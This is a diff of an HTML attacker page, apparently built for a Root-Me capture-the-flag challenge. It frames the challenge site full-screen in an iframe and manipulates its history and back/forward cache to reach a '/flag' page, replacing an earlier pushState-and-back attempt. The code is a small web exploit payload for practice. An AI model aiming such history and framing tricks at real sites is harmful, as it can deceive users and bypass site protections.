@@ -2,11 +2,25 @@
 <html>
 <head>
 <script>
-  // AVANT tout : push /flag dans l'historique
-  history.pushState({}, '', 'http://challenge01.root-me.org:58007/flag');
+addEventListener('DOMContentLoaded', () => {
+  const iframe = document.createElement('iframe');
+  iframe.src = 'http://challenge01.root-me.org:58007/';
+  iframe.style.cssText = `
+    position:fixed;top:0;left:0;width:100vw;height:100vh;
+    border:none;z-index:999999;background:white;
+  `;
   
-  // Puis back IMMÉDIAT = restauration bfcache SANS page.goto()
-  setTimeout(() => history.back(), 0);
+  iframe.onload = () => {
+    // MAINTENANT on peut pushState() !
+    const iframeWin = iframe.contentWindow;
+    iframeWin.history.pushState({}, '', '/flag');
+    
+    // Back pour bfcache
+    setTimeout(() => iframeWin.history.back(), 10);
+  };
+  
+  document.body.appendChild(iframe);
+});
 </script>
 </head>
 <body></body>
